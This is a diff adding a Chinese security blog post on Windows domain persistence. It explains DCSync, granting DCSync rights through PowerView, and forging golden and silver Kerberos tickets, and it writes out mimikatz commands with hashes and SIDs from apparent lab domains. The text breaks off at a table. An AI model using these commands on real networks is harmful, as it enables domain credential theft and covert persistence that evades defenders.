@@ -1,0 +1,635 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Windows域-权限维持 | ke1nys`Blog</title><meta name="author" content="ke1nys"><meta name="copyright" content="ke1nys"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="这里的使用这个的前提就是已经拿下域控了  并且拿下管理员账户了 为了防止蓝队把我们踢出局  所以执行这个是必要的 DC Sync参考文章 介绍DCSync是mimikatz的一个功能，能够模拟域控制器并从域控制器导出帐户密码hash 在域环境中，不同域控制器（DC）之间，每 15 分钟都会有一次域数据的同步。当一个域控制器（DC 1）想从其他域控制器（DC2）获取数据时，DC 1 会向 DC 2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows域-权限维持">
+<meta property="og:url" content="https://ke1nys.github.io/posts/a3cbb047.html">
+<meta property="og:site_name" content="ke1nys&#96;Blog">
+<meta property="og:description" content="这里的使用这个的前提就是已经拿下域控了  并且拿下管理员账户了 为了防止蓝队把我们踢出局  所以执行这个是必要的 DC Sync参考文章 介绍DCSync是mimikatz的一个功能，能够模拟域控制器并从域控制器导出帐户密码hash 在域环境中，不同域控制器（DC）之间，每 15 分钟都会有一次域数据的同步。当一个域控制器（DC 1）想从其他域控制器（DC2）获取数据时，DC 1 会向 DC 2">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg">
+<meta property="article:published_time" content="2023-09-17T08:24:08.000Z">
+<meta property="article:modified_time" content="2023-09-25T03:40:35.856Z">
+<meta property="article:author" content="ke1nys">
+<meta property="article:tag" content="内网">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg"><link rel="shortcut icon" href="/img/zhuzhu.png"><link rel="canonical" href="https://ke1nys.github.io/posts/a3cbb047"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="manifest" href="/manifest.json"/><meta name="msapplication-TileColor" content="#3b70fc"/><link rel="apple-touch-icon" sizes="180x180" href="/img/siteicon/128.png"/><link rel="icon" type="image/png" sizes="32x32" href="/img/siteicon/32.png"/><link rel="icon" type="image/png" sizes="16x16" href="/img/siteicon/16.png"/><link rel="mask-icon" href="/img/siteicon/128.png" color="#5bbad5"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Windows域-权限维持',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-09-25 11:40:35'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.css" /><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><link rel="stylesheet" href="https://npm.elemecdn.com/anzhiyu-blog@2.0.4/css/runtime/runtime.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://cdn.cbd.int/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/hexo-filter-gitcalendar/lib/gitcalendar.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ke1nys`Blog" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/qq.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">131</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">121</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">ke1nys`Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Windows域-权限维持</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-09-17T08:24:08.000Z" title="发表于 2023-09-17 16:24:08">2023-09-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-09-25T03:40:35.856Z" title="更新于 2023-09-25 11:40:35">2023-09-25</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">7.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>26分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Windows域-权限维持"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>这里的使用这个的前提就是已经拿下域控了  并且拿下管理员账户了</p>
+<p>为了防止蓝队把我们踢出局  所以执行这个是必要的</p>
+<h2 id="DC-Sync"><a href="#DC-Sync" class="headerlink" title="DC Sync"></a>DC Sync</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/124274233">参考文章</a></p>
+<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>DCSync是<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=mimikatz&amp;spm=1001.2101.3001.7020">mimikatz</a>的一个功能，能够模拟域控制器并从域控制器导出帐户密码hash</p>
+<p>在域环境中，不同域控制器（DC）之间，每 15 分钟都会有一次域数据的同步。当一个域控制器（DC 1）想从其他域控制器（DC2）获取数据时，DC 1 会向 DC 2 发起一个 GetNCChanges 请求，该请求的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程。</p>
+<p>DCSync 就是利用的这个原理，通过 Directory Replication Service（DRS） 服务的 GetNCChanges 接口向域控发起数据同步请求。</p>
+<p>新版本的 Mimikatz新增加了 DCSync 功能。该功能可以模仿一个域控制器，从真实的域控制器中请求数据，例如用户的哈希。该功能最大的特点就是可以实现不登录到域控而获取域控上的数据</p>
+<p><strong>当获得了域内管理员权限，如果能修改域内普通用户的权限，使其具有DCSync权限的话，那么普通域用户也能导出域内用户的哈希，这样可以做一个隐蔽的权限维持</strong>。默认只有域控主机账号和域管理员能Dcsync，域管和邮件服务器的机器账号有写ACL的权限，可以给指定用户添加Dcsync来dump域哈希。</p>
+<h3 id="利用-导出hash"><a href="#利用-导出hash" class="headerlink" title="利用(导出hash)"></a>利用(导出hash)</h3><p>导出域用户hash，需获取以下任意用户的权限：</p>
+<ul>
+<li>Administrators组内的用户</li>
+<li>Domain Admins组内的用户</li>
+<li>Enterprise Admins组内的用户</li>
+<li>域控制器的计算机帐户</li>
+</ul>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230917163932351.png" alt="image-20230917163932351"></p>
+<p><strong>四个用户的简介</strong></p>
+<p>在我们拿下这个域控之后  我们就可以dump全部人的hash值了</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230917164100983.png" alt="image-20230917164100983"></p>
+<p>这里是获取krbtgt的hash值  如果想要获取全部人的hash值得话</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230917164209206.png" alt="image-20230917164209206"></p>
+<p>dump所有人得hash值  并且以csv的格式进行输出</p>
+<p>其实在这里的话我们是可以在获取这个krbtgt的hash值情况下   进行创建黄金票据来注入内存  来使这台计算机具有管理员权限  这里的话就使用别的方法</p>
+<h3 id="维持-给别的计算机添加管理员权限"><a href="#维持-给别的计算机添加管理员权限" class="headerlink" title="维持(给别的计算机添加管理员权限)"></a>维持(给别的计算机添加管理员权限)</h3><p>DCsync是几个权限的集合体，如果使其具有DCSync权限的话，可以使用powerview.ps1向域内普通用户添加如下三条ACE(Access Control Entries)：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230917164909007.png" alt="image-20230917164909007"></p>
+<p>在域管用户的机器上执行 给别的机器上的普通用户yuwin7添加以上三条ACE</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#添加ACE</span><br><span class="line">powershell -exec bypass</span><br><span class="line">import-module .\PowerView.ps1;Add-DomainObjectAcl -TargetIdentity “DC=test,DC=lab” -PrincipalIdentity yuwin7 -Rights DCSync -Verbose</span><br><span class="line"> </span><br><span class="line">#使用完后可以删除ACE</span><br><span class="line">Remove-DomainObjectAcl -TargetIdentity “DC=test,DC=lab” -PrincipalIdentity yuwin7 -Rights DCSync -Verbose</span><br></pre></td></tr></table></figure>
+<p>这里的话普通用户yuwin7就能执行管理员权限还dump出所有人的hash值了</p>
+<h2 id="黄金票据和白银票据"><a href="#黄金票据和白银票据" class="headerlink" title="黄金票据和白银票据"></a>黄金票据和白银票据</h2><p><a target="_blank" rel="noopener" href="https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/#%E9%93%B6%E7%A5%A8-SilverTickets">参考文章</a></p>
+<p>其实这里的话在之前的几个模块就已经写过了  但是为了加深印象和总结  就重新在写一遍  加深印象</p>
+<p><strong>在学习这两个协议之前  可以先去看看我之前写的一篇这个关于 <a href="https://ke1nys.github.io/posts/1bedf17b.html">Kerberos</a>协议的文章</strong></p>
+<p>学习这个的前提还是得先了解<code>kerberos</code>协议的身份验证流程</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/d8b0bf2303eb0486da1737ac6a07da51.png" alt="img"></p>
+<p><strong>然后了解一下会用到的东西</strong></p>
+<ul>
+<li><strong>KDC</strong>(Key Distribution Center)： 密钥分发中心，里面包含两个服务：AS和TGS</li>
+<li><strong>AS</strong>(Authentication Server)： 身份认证服务</li>
+<li><strong>TGS</strong>(Ticket Granting Server)： 票据授予服务</li>
+<li><strong>TGT</strong>(Ticket Granting Ticket): 由身份认证服务授予的票据，用于身份认证，存储在内存，默认有效期为10小时</li>
+<li><strong>Pass The Ticket</strong>： 如果我们能够拿到用户的TGT，并将其导入到内存，就可以冒充该用户获得其访问权限</li>
+</ul>
+<p>这里的话就不多介绍了  因为在上面给了一篇文章详细的讲了这个流程</p>
+<h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>黄金门票是伪造的TGT。这意味着我们绕过上图的步骤 1 和 2，在那里我们向 DC 证明我们是谁  <strong>可以说有了金票就有了域内的最高权限</strong></p>
+<p> 每个用户的Ticket都是由krbtgt的密码Hash来生成的，那么，我们如果拿到了krbtgt的密码Hash，其实就可以伪造任意用户的TICKET,</p>
+<p> 对于攻击者来说，实际上只要拿到了域控权限，就可以直接导出krbtgt的Hash值，，再通过mimikatz即可生成任意用户任何权限的Ticket，也就是Golden Ticket。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/2016011804523676070160.png" alt="Alt text"></p>
+<p>这就是黄金票据和白银票据的生成过程</p>
+<h4 id="黄金票据特点"><a href="#黄金票据特点" class="headerlink" title="黄金票据特点"></a>黄金票据特点</h4><ul>
+<li>域控制器中的KDC服务不验证TGT中的用户帐户，直到<a target="_blank" rel="noopener" href="http://passing-the-hash.blogspot.com/2014/09/pac-validation-20-minute-rule-and.html">TGT超过20分钟，</a>这意味着攻击者可以使用禁用和删除的帐户，甚至是在Active Directory中不存在的虚拟帐户。</li>
+</ul>
+<blockquote>
+<p>简单点说就是我们绕过了KDC来创建TGT了  但是KDC会验证我们TGT票据里的用户是否有效  证明有效的前提就是该用户的时间戳不超过20分钟 (未被禁用、删除或不存在——-&gt; 这些用户都是符合的)</p>
+</blockquote>
+<ul>
+<li>由于在域控制器上由KDC服务生成的域设置了Kerberos策略，如果提供票据，则系统信任票据的有效性。这意味着，即使域策略声明Kerberos登录票据（TGT）只有10小时有效，如果票据声明有效期为10 年，那么也会信任票据的有效性期为10年。</li>
+<li>该<a target="_blank" rel="noopener" href="http://adsecurity.org/?p=483">KRBTGT</a>帐户密码<a target="_blank" rel="noopener" href="http://adsecurity.org/?p=483">从不更改*</a>和直到KRBTGT密码被更改（两次），攻击者可以创建黄金票据。<strong>请注意，即使伪造用户更改其密码，创建用于模拟用户的Golden Ticket仍然存在。</strong></li>
+<li>它绕过了SmartCard身份验证要求，因为它绕过了DC在创建TGT之前执行的常规验证。</li>
+<li>.这个精心创建的TGT要求攻击者拥有Active Directory域的KRBTGT密码哈希值（<a target="_blank" rel="noopener" href="http://adsecurity.org/?p=451">通常从域控制器转储</a>）。</li>
+<li>KRBTGT NTLM哈希可用于生成一个有效的TGT（使用RC4）模拟任何用户访问Active Directory中的任何资源。</li>
+<li>在主机上都可以生成和使用黄金票据（TGT），即使没有加入域也是如此。只要网络可以访问域。</li>
+<li>用于从AD森林中的DC获取有效的TGS票据，并提供一个坚持在一切域访问所有的主机的好办法。</li>
+</ul>
+<h4 id="制作条件"><a href="#制作条件" class="headerlink" title="制作条件"></a>制作条件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、域名称            </span><br><span class="line">2、域的SID值</span><br><span class="line">3、域的KRBTGT账户密码HASH</span><br><span class="line">4、伪造用户名，可以是任意的</span><br></pre></td></tr></table></figure>
+<h4 id="制作步骤"><a href="#制作步骤" class="headerlink" title="制作步骤"></a>制作步骤</h4><h5 id="1-导出krbtgt的Hash"><a href="#1-导出krbtgt的Hash" class="headerlink" title="1.导出krbtgt的Hash"></a><strong>1.导出krbtgt的Hash</strong></h5><p>金票的生成需要用到krbtgt的密码HASH值，可以通过mimikatz中的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:za.tryhackme.loc /user:krbtgt@za.tryhackme.loc</span><br></pre></td></tr></table></figure>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230918093409490.png" alt="image-20230918093409490"></p>
+<h5 id="2-生成Golden-Ticket"><a href="#2-生成Golden-Ticket" class="headerlink" title="2.生成Golden Ticket"></a><strong>2.生成Golden Ticket</strong></h5><p> 得到KRBTGT HASH之后使用mimikatz中的kerberos::golden功能生成金票golden.kiribi，即为伪造成功的TGT。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/admin：伪造的用户名</span><br><span class="line">/domain：域名称</span><br><span class="line">/sid：SID值，注意是去掉最后一个-后面的值</span><br><span class="line">/krbtgt：krbtgt的HASH值</span><br><span class="line">/ticket：生成的票据名称</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /admin:administrator /domain:0day.org /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /ticket:golden.kiribi</span><br></pre></td></tr></table></figure>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230918093717184.png" alt="image-20230918093717184"></p>
+<h5 id="3-导入伪造Golden-Ticket获得域控权限"><a href="#3-导入伪造Golden-Ticket获得域控权限" class="headerlink" title="3. 导入伪造Golden Ticket获得域控权限"></a><strong>3. 导入伪造Golden Ticket获得域控权限</strong></h5><p>通过mimikatz中的kerberos::ptt功能（Pass The Ticket）将golden.kiribi导入内存中。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br><span class="line">kerberos::ptt golden.kiribi</span><br><span class="line">kerberos::list</span><br></pre></td></tr></table></figure>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230918093932637.png" alt="image-20230918093932637"></p>
+<p>这样成功伪造这台计算机的本地管理员用户了  然后以后这台计算机登录的任何用户都获得这个本地管理员的权限  因为已经注入到内存中了</p>
+<p>此时就可以通过dir成功访问域控的共享文件夹。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230918094149486.png" alt="image-20230918094149486"></p>
+<h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><ul>
+<li><strong>这种方式导入的Ticket默认在20分钟以内生效，如果过期了，再次ptt导入Golden Ticket即可。</strong></li>
+<li>可以伪造任意用户，即使其不存在。</li>
+<li>krbtgt的NTLM hash不会轻易改变，即使修改域控管理员密码。</li>
+</ul>
+<h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p> Silver Tickets（下面称银票）就是伪造的ST（Service Ticket），因为在TGT已经在PAC里限定了给Client授权的服务（通过SID的值） <strong>就是说计算机已经固定了</strong>，所以银票只能访问指定服务。</p>
+<p>银票是伪造的TGS门票。所以现在，我们跳过了与 DC 上的 K DC 进行的所有通信（上图中的步骤 1-4），只与我们希望直接访问的服务进行接口</p>
+<p>这里的话我在这个 <a href="https://ke1nys.github.io/posts/1bedf17b.html">Kerberos协议中</a> 已经详细的介绍了  和黄金票据一样  先去了解一下</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230918094901060.png" alt="image-20230918094901060"></p>
+<p><strong>白银票据认证流程</strong></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/20160118045256924591213.png" alt="Alt text"></p>
+<h4 id="白银票据特点"><a href="#白银票据特点" class="headerlink" title="白银票据特点"></a>白银票据特点</h4><ul>
+<li>.白银票据是一个有效的票据授予服务（TGS）Kerberos票据，因为Kerberos验证服务运行的每台服务器都对服务主体名称的服务帐户进行加密和签名。</li>
+<li>黄金票据是伪造TGT并且有效的获得任何Kerberos服务，而白银票据是伪造TGS。这意味着白银票据仅限于特定服务器上的任何服务。</li>
+<li>大多数服务不验证PAC（通过将PAC校验和发送到域控制器进行PAC验证），因此使用服务帐户密码哈希生成的有效TGS可以完全伪造PAC</li>
+<li>攻击者需要服务帐户密码哈希值</li>
+<li>TGS是伪造的，所以没有和TGT通信，意味着DC从验证过。</li>
+<li>任何事件日志都在目标服务器上。</li>
+</ul>
+<h4 id="制作条件-1"><a href="#制作条件-1" class="headerlink" title="制作条件"></a>制作条件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.域名称</span><br><span class="line">2.域的SID值</span><br><span class="line">3.域中的Server服务器账户的NTLM-Hash</span><br><span class="line">4.伪造的用户名，可以是任意用户名.</span><br><span class="line">5.目标服务器上面的kerberos服务</span><br></pre></td></tr></table></figure>
+<h4 id="白银票据的服务列表"><a href="#白银票据的服务列表" class="headerlink" title="白银票据的服务列表"></a>白银票据的服务列表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">服务名称                    同时需要的服务</span><br><span class="line">WMI                        HOST、RPCSS</span><br><span class="line">PowerShell Remoting        HOST、HTTP</span><br><span class="line">WinRM                    HOST、HTTP</span><br><span class="line">Scheduled Tasks            HOST</span><br><span class="line">Windows File Share        CIFS</span><br><span class="line">LDAP                    LDAP</span><br><span class="line">Windows Remote Server    RPCSS、LDAP、CIFS</span><br></pre></td></tr></table></figure>
+<h4 id="制作步骤-1"><a href="#制作步骤-1" class="headerlink" title="制作步骤"></a>制作步骤</h4><h5 id="1-获取hash-sid等信息"><a href="#1-获取hash-sid等信息" class="headerlink" title="1.获取hash sid等信息"></a>1.获取hash sid等信息</h5><p>首先我们需要知道服务账户的密码HASH  这里我们获取的不是本地计算机的hash值  我们获取的是这台计算机的hash值</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230918100049041.png" alt="image-20230918100049041"></p>
+<h5 id="2-伪造白银票据"><a href="#2-伪造白银票据" class="headerlink" title="2.伪造白银票据"></a>2.伪造白银票据</h5><p>这时得到了THMWRK1$的HASH值，通过mimikatz生成银票。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/domain：当前域名称</span><br><span class="line">/sid：SID值，和金票一样取前面一部分</span><br><span class="line">/target：目标主机，这里是thmwrk1.za.tryhackme.loc</span><br><span class="line">/service：服务名称，这里需要访问共享文件，所以是cifs</span><br><span class="line">/rc4：目标主机的HASH值</span><br><span class="line">/user：伪造的用户名</span><br><span class="line">/ptt：表示的是Pass TheTicket攻击，是把生成的票据导入内存，也可以使用/ticket导出之后再使用kerberos::ptt来导入</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185 /target:thmwrk1.za.tryhackme.loc /service:cifs /rc4:c19d46ece8776ef0c4697daad3b6b13f /user:silver /ptt</span><br></pre></td></tr></table></figure>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230918100440838.png" alt="image-20230918100440838"></p>
+<p>这样的话我们就可以访问这个DC的共享文件夹了</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230918100740794.png" alt="image-20230918100740794"></p>
+<p>这里我们只是伪造了这个<code>cifs</code>(<strong>DC共享文件夹访问权限</strong>)    其实上面还给了好几种访问  我们也是可以进行伪造的</p>
+<h4 id="各种服务中的示例"><a href="#各种服务中的示例" class="headerlink" title="各种服务中的示例"></a>各种服务中的示例</h4><div class="table-container">
+<table>
+<thead>
+<tr>
